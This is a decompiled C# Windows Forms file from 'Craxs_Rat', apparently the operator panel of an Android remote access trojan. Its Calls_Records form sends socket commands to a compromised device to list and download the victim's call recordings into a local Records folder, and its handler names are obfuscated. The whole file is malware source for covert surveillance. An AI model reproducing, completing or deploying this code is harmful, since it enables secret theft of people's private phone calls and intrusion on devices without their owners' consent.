using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class Calls_Records : Form
{
	public delegate void AddNew(object[] objs);

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	public string Title;

	public Client ClassClient;

	public TcpClient Client;

	public string DownloadsFolder;

	[field: AccessedThroughProperty("DataGridView1")]
	internal virtual DataGridView DataGridView1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("thestat")]
	internal virtual DataGridViewTextBoxColumn thestat
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ico")]
	internal virtual DataGridViewImageColumn ico
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("num")]
	internal virtual DataGridViewTextBoxColumn num
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("appnam")]
	internal virtual DataGridViewTextBoxColumn appnam
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("stus")]
	internal virtual DataGridViewTextBoxColumn stus
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatswfebcz;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon4 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsaercx;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon1 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("loadingbar")]
	internal virtual DrakeUILoadingBar loadingbar
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsrhtsqw;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon2 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public Calls_Records()
	{
		base.Load += CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdzxcf;
		base.FormClosing += Calls_Records_FormClosing;
		Title = "null";
		Client = new TcpClient();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		this.DataGridView1 = new System.Windows.Forms.DataGridView();
		this.thestat = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ico = new System.Windows.Forms.DataGridViewImageColumn();
		this.num = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.appnam = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.stus = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.loadingbar = new DrakeUI.Framework.DrakeUILoadingBar();
		this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon4 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		((System.ComponentModel.ISupportInitialize)this.DataGridView1).BeginInit();
		this.Panel1.SuspendLayout();
		base.SuspendLayout();
		this.DataGridView1.AllowUserToAddRows = false;
		this.DataGridView1.AllowUserToDeleteRows = false;
		this.DataGridView1.AllowUserToResizeColumns = false;
		this.DataGridView1.AllowUserToResizeRows = false;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle.Font = new System.Drawing.Font("Roboto Slab", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.DataGridView1.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.DataGridView1.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DataGridView1.BackgroundColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle2.BackColor = System.Drawing.SystemColors.Control;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Roboto Slab", 8.25f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.SystemColors.WindowText;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DataGridView1.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.DataGridView1.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DataGridView1.Columns.AddRange(this.thestat, this.ico, this.num, this.appnam, this.stus);
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle3.BackColor = System.Drawing.SystemColors.Window;
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Roboto Slab", 8.25f);
		dataGridViewCellStyle3.ForeColor = System.Drawing.SystemColors.ControlText;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DataGridView1.DefaultCellStyle = dataGridViewCellStyle3;
		this.DataGridView1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DataGridView1.Location = new System.Drawing.Point(0, 51);
		this.DataGridView1.Name = "DataGridView1";
		this.DataGridView1.ReadOnly = true;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle4.BackColor = System.Drawing.SystemColors.Control;
		dataGridViewCellStyle4.Font = new System.Drawing.Font("Roboto Slab", 8.25f);
		dataGridViewCellStyle4.ForeColor = System.Drawing.SystemColors.WindowText;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DataGridView1.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.DataGridView1.RowHeadersVisible = false;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle5.Font = new System.Drawing.Font("Roboto Slab", 8.25f);
		this.DataGridView1.RowsDefaultCellStyle = dataGridViewCellStyle5;
		this.DataGridView1.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DataGridView1.ShowCellErrors = false;
		this.DataGridView1.ShowCellToolTips = false;
		this.DataGridView1.ShowEditingIcon = false;
		this.DataGridView1.ShowRowErrors = false;
		this.DataGridView1.Size = new System.Drawing.Size(593, 390);
		this.DataGridView1.TabIndex = 2;
		this.thestat.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		this.thestat.HeaderText = "Status";
		this.thestat.Name = "thestat";
		this.thestat.ReadOnly = true;
		this.thestat.Width = 50;
		this.ico.FillWeight = 25f;
		this.ico.HeaderText = "     ";
		this.ico.ImageLayout = System.Windows.Forms.DataGridViewImageCellLayout.Zoom;
		this.ico.Name = "ico";
		this.ico.ReadOnly = true;
		this.num.FillWeight = 86.49746f;
		this.num.HeaderText = "Number";
		this.num.Name = "num";
		this.num.ReadOnly = true;
		this.appnam.FillWeight = 86.49746f;
		this.appnam.HeaderText = "Date";
		this.appnam.Name = "appnam";
		this.appnam.ReadOnly = true;
		this.stus.FillWeight = 86.49746f;
		this.stus.HeaderText = "Downloaded";
		this.stus.Name = "stus";
		this.stus.ReadOnly = true;
		this.Panel1.Controls.Add(this.loadingbar);
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon2);
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon4);
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon1);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel1.Location = new System.Drawing.Point(0, 0);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(593, 51);
		this.Panel1.TabIndex = 5;
		this.loadingbar.Enabled = false;
		this.loadingbar.Font = new System.Drawing.Font("Calibri", 12f);
		this.loadingbar.ForeColor = System.Drawing.Color.FromArgb(230, 80, 80);
		this.loadingbar.Location = new System.Drawing.Point(526, 6);
		this.loadingbar.Name = "loadingbar";
		this.loadingbar.Size = new System.Drawing.Size(55, 32);
		this.loadingbar.Style = DrakeUI.Framework.UIStyle.Red;
		this.loadingbar.TabIndex = 21;
		this.loadingbar.Text = "DrakeUILoadingBar1";
		this.loadingbar.Visible = false;
		this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon2.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon2.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon2.FillSelectedColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon2.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon2.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon2.ForePressColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(147, 12);
		this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
		this.DrakeUIButtonIcon2.Radius = 25;
		this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon2.RectHoverColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon2.RectPressColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon2.RectSelectedColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(118, 26);
		this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon2.Symbol = 61473;
		this.DrakeUIButtonIcon2.TabIndex = 20;
		this.DrakeUIButtonIcon2.Text = "Refresh";
		this.DrakeUIButtonIcon4.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon4.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon4.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon4.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon4.FillSelectedColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon4.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon4.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon4.ForePressColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon4.Location = new System.Drawing.Point(271, 12);
		this.DrakeUIButtonIcon4.Name = "DrakeUIButtonIcon4";
		this.DrakeUIButtonIcon4.Radius = 25;
		this.DrakeUIButtonIcon4.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon4.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon4.RectHoverColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon4.RectPressColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon4.RectSelectedColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon4.Size = new System.Drawing.Size(163, 26);
		this.DrakeUIButtonIcon4.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon4.Symbol = 61564;
		this.DrakeUIButtonIcon4.TabIndex = 19;
		this.DrakeUIButtonIcon4.Text = "Records Folder";
		this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon1.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon1.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon1.FillSelectedColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon1.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon1.ForePressColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(12, 12);
		this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
		this.DrakeUIButtonIcon1.Radius = 25;
		this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon1.RectPressColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(129, 26);
		this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon1.Symbol = 57490;
		this.DrakeUIButtonIcon1.TabIndex = 18;
		this.DrakeUIButtonIcon1.Text = "Download";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		base.ClientSize = new System.Drawing.Size(593, 441);
		base.Controls.Add(this.DataGridView1);
		base.Controls.Add(this.Panel1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.SizableToolWindow;
		base.Name = "Calls_Records";
		base.ShowIcon = false;
		this.Text = "Calls_Records";
		((System.ComponentModel.ISupportInitialize)this.DataGridView1).EndInit();
		this.Panel1.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public void Addrecord(object[] objs)
	{
		if (DataGridView1.InvokeRequired)
		{
			AddNew method = Addrecord;
			DataGridView1.Invoke(method, new object[1] { objs });
			return;
		}
		try
		{
			int index = DataGridView1.Rows.Add(objs[0], objs[1], objs[2], objs[3], objs[5]);
			DataGridViewRow dataGridViewRow = DataGridView1.Rows[index];
			dataGridViewRow.Tag = RuntimeHelpers.GetObjectValue(objs[6]);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
	}

	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdzxcf(object sender, EventArgs e)
	{
		if (ClassClient != null)
		{
			string[] array = ClassClient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "GRC<*>T" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + ClassClient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				ClassClient
			};
			ClassClient.SendMessage(parametersObjects);
			loadingbar.Enabled = true;
			loadingbar.Visible = true;
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsaercx(object sender, EventArgs e)
	{
		if (ClassClient == null)
		{
			return;
		}
		if (DataGridView1.SelectedRows.Count > 0)
		{
			foreach (object selectedRow in DataGridView1.SelectedRows)
			{
				object objectValue = RuntimeHelpers.GetObjectValue(selectedRow);
				string[] array = ClassClient.Keys.Split(':');
				int num = 0;
				int num2 = 0;
				if (NewLateBinding.LateGet(objectValue, null, "tag", new object[0], null, null, null) != null)
				{
					object[] parametersObjects = new object[4]
					{
						ClassClient.myClient,
						Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(SecurityKey.KeysClient2 + Data.SPL_SOCKET + "gtrc<*>" + NewLateBinding.LateGet(objectValue, null, "tag", new object[0], null, null, null).ToString() + "#", NewLateBinding.LateGet(objectValue, null, "tag", new object[0], null, null, null)), Data.SPL_SOCKET), array[0]), Data.SPL_SOCKET), array[1]), Data.SPL_SOCKET), SecurityKey.Lockscreen), Data.SPL_SOCKET), Conversions.ToString(num)), Data.SPL_SOCKET), Conversions.ToString(num2)), Data.SPL_SOCKET), Data.SPL_ARRAY), Data.SPL_SOCKET), ClassClient.ClientRemoteAddress),
						Codes.Encoding().GetBytes("null"),
						ClassClient
					};
					ClassClient.SendMessage(parametersObjects);
				}
			}
			return;
		}
		Interaction.MsgBox("Select Record To Download!!!", MsgBoxStyle.MsgBoxHelp);
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatswfebcz(object sender, EventArgs e)
	{
		try
		{
			if (!Directory.Exists(DownloadsFolder + "\\Records"))
			{
				Directory.CreateDirectory(DownloadsFolder + "\\Records");
			}
			Process.Start(DownloadsFolder + "\\Records");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Calls_Records_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			loadingbar.Visible = false;
			loadingbar.Enabled = false;
			loadingbar.Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsrhtsqw(object sender, EventArgs e)
	{
		if (ClassClient != null)
		{
			string[] array = ClassClient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "GRC<*>T" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + ClassClient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				ClassClient
			};
			ClassClient.SendMessage(parametersObjects);
			loadingbar.Enabled = true;
			loadingbar.Visible = true;
		}
	}
}
